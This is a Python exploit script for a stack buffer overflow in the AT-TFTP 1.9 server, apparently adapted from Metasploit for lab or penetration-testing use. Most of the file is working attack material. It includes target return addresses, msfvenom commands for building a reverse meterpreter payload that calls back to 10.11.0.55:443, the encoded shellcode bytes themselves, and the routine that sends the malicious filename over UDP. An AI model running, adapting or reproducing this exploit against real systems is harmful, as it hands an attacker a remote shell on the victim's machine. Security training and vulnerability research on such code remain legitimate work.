#!/usr/bin/python
## attftp_long_filename.py by Muhammad Haidari https://github.com/Muhammd/attftp_long_filename
##
## Exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name.
## Extracted from Metasploit  
##
## Spawns a reverse meterpreter shell to 10.11.0.55:443
##
##
## TODO: adjust 
##		- pick the right return address for the appropriate target
##
## Usage: python attftp_long_filename.py <IP Address> <Port> <Your IP Address>

import sys, socket


rhost = sys.argv[1] 				# Target IP address as command line argument
rport = int(sys.argv[2])		# Target Port as command line argument
lhost = sys.argv[3]				  # Attackers IP address


## Return addresses according to metasploit:
##
##          [ 'Windows NT SP4 English',   { 'Ret' => 0x702ea6f7 } ],
##          [ 'Windows 2000 SP0 English', { 'Ret' => 0x750362c3 } ],
##          [ 'Windows 2000 SP1 English', { 'Ret' => 0x75031d85 } ],
##          [ 'Windows 2000 SP2 English', { 'Ret' => 0x7503431b } ],
##          [ 'Windows 2000 SP3 English', { 'Ret' => 0x74fe1c5a } ],
##          [ 'Windows 2000 SP4 English', { 'Ret' => 0x75031dce } ],
##          [ 'Windows XP SP0/1 English', { 'Ret' => 0x71ab7bfb } ],
##          [ 'Windows XP SP2 English',   { 'Ret' => 0x71ab9372 } ],
##          [ 'Windows XP SP3 English',   { 'Ret' => 0x7e429353 } ], # ret by c0re
##          [ 'Windows Server 2003',      { 'Ret' => 0x7c86fed3 } ], # ret donated by securityxxxpert
##          [ 'Windows Server 2003 SP2',  { 'Ret' => 0x7c86a01b } ], # ret donated by Polar Bear



ret = "\xd3\xfe\x86\x7c"			# Return address (Little Endian)

nops = "\x90" *(25-len(lhost))			## Create NOP sled to brin NOPs & LHOST to 25 bytes



## Max space for shell code = 210
## Bad characters according to metasploit: \x00
## Payload via: 
##
## Generate payload: msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=10.11.0.55 LPORT=443 -a x86 --platform Windows -f raw -o payload
##
## Prepend a stack adjust of -3500 to the payload before encoding:
## Obtain stack adjust of -3500 (0xdac as per printf '%x\n' 3500) with /usr/share/metasploit-framework/tools/nasm_shell.rb:	
##       nasm > sub esp, 0xdac
##	 00000000  81ECAC0D0000      sub esp,0xdac
## add opcodes to a file: perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
##
## Combine stackadj & payload: cat stackadj payload > shellcode
## hexdump -C shellcode
## 00000000  81 ec ac 0d 00 00 fc 6a  eb 47 e8 f9 ff ff ff 60  |.......j.G.....`|
## 00000010  31 db 8b 7d 3c 8b 7c 3d  78 01 ef 8b 57 20 01 ea  |1..}<.|=x...W ..|
## 00000020  8b 34 9a 01 ee 31 c0 99  ac c1 ca 0d 01 c2 84 c0  |.4...1..........|
## 00000030  75 f6 43 66 39 ca 75 e3  4b 8b 4f 24 01 e9 66 8b  |u.Cf9.u.K.O$..f.|
## 00000040  1c 59 8b 4f 1c 01 e9 03  2c 99 89 6c 24 1c 61 ff  |.Y.O....,..l$.a.|
## 00000050  e0 31 db 64 8b 43 30 8b  40 0c 8b 70 1c ad 8b 68  |.1.d.C0.@..p...h|
## 00000060  08 5e 66 53 66 68 33 32  68 77 73 32 5f 54 66 b9  |.^fSfh32hws2_Tf.|
## 00000070  72 60 ff d6 95 53 53 53  53 43 53 43 53 89 e7 66  |r`...SSSSCSCS..f|
## 00000080  81 ef 08 02 57 53 66 b9  e7 df ff d6 66 b9 a8 6f  |....WSf.....f..o|
## 00000090  ff d6 97 68 c0 a8 0c c5  66 68 01 bb 66 53 89 e3  |...h....fh..fS..|
## 000000a0  6a 10 53 57 66 b9 57 05  ff d6 50 b4 0c 50 53 57  |j.SWf.W...P..PSW|
## 000000b0  53 66 b9 c0 38 ff e6                              |Sf..8..|
## 000000b7
##
## Encode shellcode: cat shellcode | msfvenom -p - -b \x00 -a x86 --platform Windows -e x86/shikata_ga_nai -f python
## x86/shikata_ga_nai succeeded with size 210 (iteration=0)
##
buf =  ""
buf += "\xb8\xd2\x25\x68\x1a\xd9\xe8\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x2e\x31\x47\x15\x03\x47\x15\x83\xef\xfc\xe2"
buf += "\x27\xa4\x84\xb6\xca\xa7\x54\x3b\xbe\x4c\x13\x2b\xc7"
buf += "\x6c\x63\x54\x57\xa2\x47\x20\xea\xf8\xfc\x4b\x29\x79"
buf += "\x02\x5b\xda\x2e\x24\xa2\x36\x5b\x10\x3e\xc7\xb2\x68"
buf += "\xfe\x5e\xe6\x4a\x34\x6d\xf6\x8e\x4d\xad\x8d\xf8\x0d"
buf += "\x4b\x57\xcf\xe7\x70\xec\x44\x48\x52\xf2\xb3\x31\x11"
buf += "\xe8\x1a\x35\x6a\x0d\x9c\xa0\x77\x01\x07\xbb\x1b\x7d"
buf += "\x2b\xdd\x1c\x9d\x62\xc6\x86\xd5\xc6\xc8\xcd\xaa\xc4"
buf += "\xa3\xa1\x36\x78\x38\x29\x4f\xdc\x59\xfa\x29\x88\x96"
buf += "\xce\xdd\x3f\xaa\x1c\x41\x94\x2a\xd9\x0f\x74\x4c\xcf"
buf += "\x65\x27\xe1\xbc\xd6\x8b\x56\x01\x8a\x82\xbe\xe3\xad"
buf += "\x7a\x48\xe9\xfa\xd7\x2f\x54\xe3\x07\x50\x70\x8a\x0e"
buf += "\x07\x13\xac\xa7\xcf\x83\x58\x43\xf0\x64\x3b\x3b\xf1"
buf += "\x31\xa5\xe8\x78\xa6\x40\x1f\x28\x7f\xf3\xa6\x99\x7a"
buf += "\x04\x0e\x75\x30\xf6\xff\x25\x6f\x54\x66\x73\x4f\x62"
buf += "\x99\x65"



tail	= ""				# tail from metasploit
tail	+= "\x83\xc4\x28\xc3" 		# <-- esp = add esp 0x28 + retn
tail	+= "\x00netascii\x00"		  # Finish as expected by the AT TFTP server

## Let's build the exploit

exploit = "\x00\x02" + nops + buf + ret + tail


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Declare a UDP socket

try:
	print "\nDelivering The Package... Please Wait"
	s.sendto(exploit, (rhost, rport))
	print "\nPackage delivered! Check you session"
except:
	print "\nCould not connect to " + rhost + ":" + str(rport) + "!"
